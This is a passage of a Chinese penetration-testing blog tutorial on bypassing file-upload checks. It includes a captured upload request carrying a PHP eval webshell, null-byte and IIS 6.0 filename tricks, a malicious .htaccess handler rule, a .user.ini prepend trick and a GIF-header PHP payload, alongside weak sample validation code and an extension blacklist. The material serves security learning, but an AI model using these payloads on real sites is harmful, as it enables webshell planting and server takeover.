<!DOCTYPE HTML>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="文件上传解析总结, 江南小虫虫的博客">
    <meta name="description" content="前言
本文参考如下链接: https://github.com/CHYbeta/Web-Security-Learning

概述Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>文件上传解析总结 | 江南小虫虫的博客</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    
    <script src="/libs/jquery/jquery.min.js"></script>
    
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper head-container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">江南小虫虫的博客</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/biaobai/表白.html" class="waves-effect waves-light">
      
      <i class="fas fa-heart" style="zoom: 0.6;"></i>
      
      <span>给亲爱的老婆仔</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">江南小虫虫的博客</div>
        <div class="logo-desc">
            
            尽力就行~~~
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			Contact
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/biaobai/表白.html" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-heart"></i>
			
			给亲爱的老婆仔
		</a>
          
        </li>
        
        
    </ul>
</div>

        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">文件上传解析总结</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/文件上传/">
                                <span class="chip bg-color">文件上传</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/渗透测试/" class="post-category">
                                渗透测试
                            </a>
                        
                            <a href="/categories/渗透测试/文件上传/" class="post-category">
                                文件上传
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2019-03-10
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2019-11-30
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    8.8k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    35 分
                </div>
                
				
                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
            
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li>本文参考如下链接: <a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning</a></li>
</ul>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Web站点一般会有<strong>用户注册</strong>的功能，当用户注册之后，大多数情况下都会存在类似<strong>头像上传</strong>等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。</p>
<a id="more"></a>
<h2 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h2><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。<strong>一般文件上传过程中将会经过如下几个检测步骤</strong>：</p>
<ul>
<li>客户端JavaScript检测 (通常为检测<code>文件扩展名</code>)</li>
<li>服务端MIME类型检测 (检测<code>Content-Type</code>内容)</li>
<li>服务端目录路径检测 (检测跟<code>Path</code>参数相关的内容)</li>
<li>服务端文件扩展名检测 (检测跟文件<code>extension</code>相关的内容)</li>
<li>服务端文件内容检测 (检测内容是否合法或含有<code>恶意代码</code>)</li>
</ul>
<h2 id="常用测试方法"><a href="#常用测试方法" class="headerlink" title="常用测试方法"></a>常用测试方法</h2><ol>
<li>上传<code>jpg</code>文件，抓包修改文件类型为脚本格式（<code>asp、aspx、php、jsp</code>等）。</li>
<li>有些应用检测上传文件类型时，通过文件名中的第一个‘<code>.</code>’来分割文件后缀名，所以可以尝试上传<code>xxx.jpg.php(asp、aspx、jsp等)</code>。</li>
</ol>
<h2 id="上传绕过方向"><a href="#上传绕过方向" class="headerlink" title="上传绕过方向"></a>上传绕过方向</h2><p>这里上传<code>xx.php</code>,然后用bp代理截断</p>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528644963_111492190_1536893293" alt></p>
<pre><code>POST /Index/shareUpload HTTP/1.1
Host: qingwendang.com
Content-Length: 221
Accept: */*
Origin: http://qingwendang.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEFWShaIYBzgEpLD
Referer: http://qingwendang.com/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bbsd036dj7d15on6rpct8tvlr5; Hm_lvt_4cf8af0a5f94f595e1b5765fcb4ee431=1528564990,1528644560; Hm_lpvt_4cf8af0a5f94f595e1b5765fcb4ee431=1528644560
Connection: close

------WebKitFormBoundaryAEFWShaIYBzgEpLD
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xx.php&quot;
Content-Type: application/x-php

&lt;?php @eval($_POST[&#39;key&#39;]);?&gt;

------WebKitFormBoundaryAEFWShaIYBzgEpLD--
</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528645407_2091826910_1536893300" alt></p>
<p>从中获取特征为：</p>
<ul>
<li>请求Header中<code>Content-Type</code>存在以下特征：<ul>
<li><code>multipart/form-data</code>（表示该请求是<strong>一个文件上传请求</strong>）</li>
<li>存在<code>boundary</code>字符串（作用为<strong>分隔符，以区分POST数据</strong>）</li>
</ul>
</li>
<li>POST的内容存在以下特征：<ul>
<li><code>Content-Disposition</code></li>
<li><code>name</code></li>
<li><code>filename</code></li>
</ul>
</li>
<li><code>POST</code>中的<code>boundary</code>的值就是<code>Content-Type</code>的值在最前面加了两个<code>--</code>，除了最后标识结束的<code>boundary</code></li>
<li>最后标识结束的<code>boundary</code>最后默认会多出两个<code>--</code>（测试时，最后一行的<code>boundary</code>删掉也能成功上传）</li>
<li>获取文件名的地方在<code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xx.php&quot;</code>和<code>Content-Type</code>里，所以绕过的地方也就在这两个地方了。</li>
</ul>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="客户端检测-JavaScript检测"><a href="#客户端检测-JavaScript检测" class="headerlink" title="客户端检测(JavaScript检测)"></a>客户端检测(JavaScript检测)</h3><h4 id="检测说明"><a href="#检测说明" class="headerlink" title="检测说明"></a>检测说明</h4><p>这类检测，通常是<strong>在上传页面里含有专门检测文件上传的JavaScript代码</strong>，最常见的就是<code>检测扩展名是否合法</code>，示例代码如下：</p>
<pre class=" language-JavaScript"><code class="language-JavaScript">function check()
{
  var filename = document.getElementById("file");
  var str = filename.value.split(".");
  var ext = str[str.length-1];
  if(ext=='jpg'||ext=='png'||ext=='jpeg'||ext=='gif')
  {
    return true;
  }
  else
  {
    alert("仅允许上传png/jpeg/gif类型的文件！")
    return false;
  }
  return false;
}</code></pre>
<h4 id="判断该类检测的套路"><a href="#判断该类检测的套路" class="headerlink" title="判断该类检测的套路"></a>判断该类检测的套路</h4><ol>
<li>选择一个<strong>禁止上传类型</strong>的文件上传，当点击<strong>确定</strong>按钮之后，浏览器立即<strong>弹窗提示禁止上传</strong>，一般就可以断定为<code>客户端JavaScript检测</code></li>
<li>可以通过<strong>配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测）</strong>。</li>
</ol>
<h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><ul>
<li>上传页面，审查元素，修改JavaScript检测函数,如利用<code>Firebug</code>定位到检测函数的调用,然后删掉它；</li>
<li>将需要<strong>上传的恶意代码文件类型改为允许上传的类型</strong>，例如将<code>dama.asp</code>改为<code>dama.jpg</code>上传，配置<code>Burp Suite</code>代理进行抓包，然后再将文件名<code>dama.jpg</code>改为<code>dama.asp</code>。</li>
<li>上传<code>webshell.jpg.jsp</code>，<strong>可能前端程序检查后缀时，从<code>前面</code>开始检查</strong>。</li>
<li>用Firefox插件: <code>yesscript2</code> 链接: <a href="https://addons.mozilla.org/zh-CN/firefox/addon/yesscript2/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/zh-CN/firefox/addon/yesscript2/?src=search</a></li>
</ul>
<h3 id="服务端MIME类型检测"><a href="#服务端MIME类型检测" class="headerlink" title="服务端MIME类型检测"></a>服务端MIME类型检测</h3><blockquote>
<p><code>MIME</code>类型用来设定<strong>某正扩展名文件的打开方式</strong>,当具有改扩展名的文件被访问时,浏览器会自动使用指定的应用程序来打开.如<code>GIF图片</code>MIME为<code>image/gif</code>,<code>CSS文件</code>MIME类型为<code>text/css</code></p>
</blockquote>
<h4 id="检测说明-1"><a href="#检测说明-1" class="headerlink" title="检测说明"></a>检测说明</h4><p>服务器端检测文件MIME类型可能的代码如下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">"image/gif"</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//检测Content-type</span>
    <span class="token keyword">echo</span><span class="token string">"Sorry,we only allow uploading GIF images"</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$uploaddir</span><span class="token operator">=</span><span class="token string">'uploads/'</span><span class="token punctuation">;</span>
  <span class="token variable">$uploadfile</span><span class="token operator">=</span><span class="token variable">$uploaddir</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$uploadfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token string">"File is valid,and was successfully uploaded.\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token string">"File uploading failed.\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<h4 id="绕过姿势-1"><a href="#绕过姿势-1" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><ul>
<li>上传<code>dama.php</code>时，然后配置<code>Burp Suite</code>代理进行拦截查看MIME类型，可以发现PHP文件的MIME类型为:<code>application/php</code>,将<code>Content-Type</code>的值修改为<code>image/gif</code>，或者其他允许的类型即可通过程序验证.。</li>
<li>常用<code>Content-Type</code>常用取值如下:</li>
</ul>
<table>
<thead>
<tr>
<th align="center">扩展名</th>
<th align="center">MIME类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">gif</td>
<td align="center">image/gif</td>
</tr>
<tr>
<td align="center">png</td>
<td align="center">image/png</td>
</tr>
<tr>
<td align="center">jpg</td>
<td align="center">image/jpeg</td>
</tr>
<tr>
<td align="center">js</td>
<td align="center">text/javascript</td>
</tr>
<tr>
<td align="center">htm</td>
<td align="center">text/html</td>
</tr>
<tr>
<td align="center">html</td>
<td align="center">text/html</td>
</tr>
</tbody></table>
<h3 id="服务端目录路径检测"><a href="#服务端目录路径检测" class="headerlink" title="服务端目录路径检测"></a>服务端目录路径检测</h3><blockquote>
<p>在文件上传时,程序通常允许用户将文件放到指定的目录中,而有些Web开发人员为了让代码更加”健壮”,通常会做一个操作:<strong>如果指定的目录存在,就将文件写入目录中,不存在则先建立目录,然后写入</strong>.这就意味着,我们可以通过bp操控目录了.</p>
</blockquote>
<p>上传的数据包中，如果存在<code>path</code>(或者其他名称)等<strong>能够操作上传路径的参数，修改该参数配合解析漏洞Get Webshell</strong>，该方法一般asp系统用比较多。</p>
<p>例如<code>path</code>参数为如下“<code>upfile/</code>”，可以尝试修改为“<code>upfile.asp/</code>”或者“<code>upfile/1.asp/</code>”或者“<code>upfile/1.asp;.</code>”，注意观察返回的文件名。返回的文件名可能为：<code>upfile/1.asp;.201704117886.jpg</code>，满足<code>IIS6.0</code>解析漏洞。</p>
<blockquote>
<p>IIS6.0在解析文件的时候，存在以下两个漏洞</p>
<ol>
<li>当建立<code>*.asa</code>、<code>*.asp</code>格式的<code>文件夹</code>时，其目录下的任意文件都将被IIS当作<code>asp文件</code>来解析</li>
<li>当<code>文件</code>为<code>*.asp;1.jpg</code>时，IIS6.0同样会以<code>ASP</code>脚本执行</li>
</ol>
</blockquote>
<h3 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="黑名单检测："><a href="#黑名单检测：" class="headerlink" title="黑名单检测："></a>黑名单检测：</h5><p>黑名单的安全性比白名单低很多，服务器端，一般会有个专门的<code>blacklist</code>文件，里面会包含常见的危险脚本文件类型，例如：</p>
<pre><code>html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc
bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh等等</code></pre><h5 id="白名单检测："><a href="#白名单检测：" class="headerlink" title="白名单检测："></a>白名单检测：</h5><p>仅允许指定的文件类型上传，比如仅允许上传<code>jpg | gif | doc | pdf</code>等类型的文件，其他文件全部禁止。</p>
<h4 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h4><h5 id="文件名大小写绕过-适用于黑名单检测方式-："><a href="#文件名大小写绕过-适用于黑名单检测方式-：" class="headerlink" title="文件名大小写绕过(适用于黑名单检测方式)："></a>文件名大小写绕过(适用于黑名单检测方式)：</h5><ul>
<li>使用<code>Asp</code>、<code>aSp</code>、<code>PhP</code>、<code>pHp</code>之类的扩展名在Windows平台上依然会被Web容器解析,从而绕过黑名单检测</li>
</ul>
<h5 id="名单列表绕过："><a href="#名单列表绕过：" class="headerlink" title="名单列表绕过："></a>名单列表绕过：</h5><ul>
<li>用黑名单里没有的名单进行攻击，比如很名单中没有的<code>asa</code>或者<code>cer</code>之类</li>
<li>能被解析的文件扩展名列表：</li>
</ul>
<pre><code>jsp jspx jspf
asp asa cer aspx
php php php3 php4
exe exee</code></pre><h5 id="特殊文件名绕过-适用于黑名单检测方式-："><a href="#特殊文件名绕过-适用于黑名单检测方式-：" class="headerlink" title="特殊文件名绕过(适用于黑名单检测方式)："></a>特殊文件名绕过(适用于黑名单检测方式)：</h5><p>比如在发送的HTTP包中，将文件名改为”<code>dama.asp.</code>”或者”<code>dama.asp_</code>”(下划线为空格)，这种命名方式在window系统里是不被允许的，所以需要在<code>Burp Suite</code>中抓包修改，上传之后，文件名会被<strong>window自动去掉后面的点或者空格</strong>，需要注意此种方法仅对window有效，Unix/Linux系统没有这个特性。</p>
<h5 id="0x00截断绕过-适用于白名单检测方式-："><a href="#0x00截断绕过-适用于白名单检测方式-：" class="headerlink" title="0x00截断绕过(适用于白名单检测方式)："></a>0x00截断绕过(适用于白名单检测方式)：</h5><p>伪代码如下：</p>
<pre><code>Name = getname(http requests)//假如这一步获取到的文件名是dama.asp.jpg(asp 后面为 0x00)
Type = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件
If(type == jpg)
SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里</code></pre><h6 id="方法一-在Hex中修改"><a href="#方法一-在Hex中修改" class="headerlink" title="方法一:在Hex中修改"></a>方法一:在Hex中修改</h6><p>上传<code>dama.jpg</code>，<code>Burp</code>抓包，将文件名改为<code>dama.php空格.jpg</code>,然后单击<code>HEX</code>选项卡进入十六进制编辑模式,将文件名中的空格的十六进制<code>20</code>改为<code>00</code>,单击<code>GO</code>按钮发送出去</p>
<h6 id="方法二-url-decode"><a href="#方法二-url-decode" class="headerlink" title="方法二:url-decode"></a>方法二:url-decode</h6><p>上传<code>dama.jpg</code>，<code>Burp</code>抓包，将文件名改为<code>dama.php%00.jpg</code>，选中<code>%00</code>，<code>右键</code>-&gt;<code>convert selection</code>-&gt;<code>url-decode</code>,单击<code>GO</code>按钮发送出去</p>
<h6 id="方法三-直接加-39-0-39"><a href="#方法三-直接加-39-0-39" class="headerlink" title="方法三:直接加&#39;\0&#39;"></a>方法三:直接加<code>&#39;\0&#39;</code></h6><p>上传<code>dama.jpg</code>，<code>Burp</code>抓包，将文件名改为<code>dama.php&#39;\0&#39;.jpg</code>,单击<code>GO</code>按钮发送出去</p>
<h6 id="方法四-直接改成php"><a href="#方法四-直接改成php" class="headerlink" title="方法四: 直接改成php"></a>方法四: 直接改成php</h6><p>上传<code>dama.jpg</code>，<code>Burp</code>抓包，将文件名改为<code>dama.php</code>,单击<code>GO</code>按钮发送出去</p>
<h5 id="上传-htaccess文件攻击：（适用于黑名单检测方式，黑名单中未限制-htaccess）"><a href="#上传-htaccess文件攻击：（适用于黑名单检测方式，黑名单中未限制-htaccess）" class="headerlink" title="上传.htaccess文件攻击：（适用于黑名单检测方式，黑名单中未限制.htaccess）"></a>上传<code>.htaccess</code>文件攻击：（适用于黑名单检测方式，黑名单中未限制<code>.htaccess</code>）</h5><p>该文件仅在<code>Apache</code>平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在<code>httpd.conf</code>文件中配置。该文件的写法如下：</p>
<pre><code>&lt;FilesMatch &quot;_php.gif&quot;&gt;
 SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre><p>保存为<code>.htaccess</code>文件。该文件的意思是，<strong>只要遇到文件名中包含有<code>”_php.gif</code>”字符串的，统一按照php文件来执行</strong>。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="noopener">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如<code>a_php.gif</code>，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有<code>.htaccess</code>文件，那么我们可以<strong>上传<code>.htaccess</code>文件覆盖掉原来的文件</strong>。</p>
<blockquote>
<p>这里有一个问题，那就是怎么知道网站是什么搭建平台，服务器类型是什么，这个一般可以通过站长之家，seo查询等查询出来，或者通过一些扫描软件扫描出来</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310200353.png" alt></p>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310210959.png" alt></p>
<h5 id="上传-user-ini攻击"><a href="#上传-user-ini攻击" class="headerlink" title="上传.user.ini攻击"></a>上传<code>.user.ini</code>攻击</h5><ul>
<li><p>当中间件是以<code>fastcgi</code>运行的php都可以用这个方法，<code>.user.ini</code>能被<strong>动态加载</strong>，它也有两个配置项：</p>
<pre><code>auto_append_file
auto_prepend_file</code></pre></li>
<li><p>只要在<code>.user.ini</code>中添加<code>auto_prepend_file=aa.jpg</code> 这句话，<strong>就可以让其他php文件执行前自动包含<code>aa.jpg</code></strong>，和<code>require()</code>类似。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310211018.png" alt></p>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310211043.png" alt></p>
<h5 id="解析漏洞绕过-适用于白名单检测方式"><a href="#解析漏洞绕过-适用于白名单检测方式" class="headerlink" title="解析漏洞绕过(适用于白名单检测方式)"></a>解析漏洞绕过(适用于白名单检测方式)</h5><p>直接上传一个注入过恶意代码的非黑名单文件即可，再利用解析漏洞利用.例如Web容器为<code>IIS 6.0</code>,攻击者将木马文件名改为<code>pentest.asp;1.jpg</code>上传,此时文件名为<code>JPG</code>格式,从而可以顺利通过验证,而<code>IIS 6.0</code>会把<code>pentest.asp;1.jpg</code>当做<code>ASP脚本</code>来执行,最终攻击者可以绕过白名单的检测,并且执行木马程序.</p>
<h3 id="服务端文件内容检测"><a href="#服务端文件内容检测" class="headerlink" title="服务端文件内容检测"></a>服务端文件内容检测</h3><ul>
<li>可能会用正则匹配，判断文件头内容是否符合要求<h4 id="文件幻数-文件头-检测："><a href="#文件幻数-文件头-检测：" class="headerlink" title="文件幻数(文件头)检测："></a>文件幻数(文件头)检测：</h4><pre><code>JPG ： FF D8 FF E0 00 10 4A 46 49 46
GIF ： 47 49 46 38 39 61 (GIF89a)
PNG： 89 50 4E 47</code></pre></li>
</ul>
<h5 id="绕过方法：-1"><a href="#绕过方法：-1" class="headerlink" title="绕过方法："></a>绕过方法：</h5><ul>
<li>主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下：</li>
<li>要绕过<code>jpg</code> 文件幻数检测就要在文件开头写上下图的值</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309222508.png" alt></p>
<ul>
<li>要绕过<code>gif</code> 文件幻数检测就要在文件开头写上下图的值</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309222455.png" alt></p>
<ul>
<li>要绕过png 文件幻数检测就要在文件开头写上下面的值</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309222525.png" alt></p>
<ul>
<li>然后在文件幻数后面加上自己的一句话木马就行了。如下</li>
</ul>
<pre><code>GIF89a&lt;?php phpinfo(); ?&gt;</code></pre><h4 id="文件相关信息检测："><a href="#文件相关信息检测：" class="headerlink" title="文件相关信息检测："></a>文件相关信息检测：</h4><ul>
<li>一般就是检查图片文件的大小，图片文件的尺寸之类的信息。</li>
<li>图像文件相关信息检测常用的就是<code>getimagesize()</code>函数</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310211105.png" alt></p>
<h5 id="绕过方法：-2"><a href="#绕过方法：-2" class="headerlink" title="绕过方法："></a>绕过方法：</h5><ul>
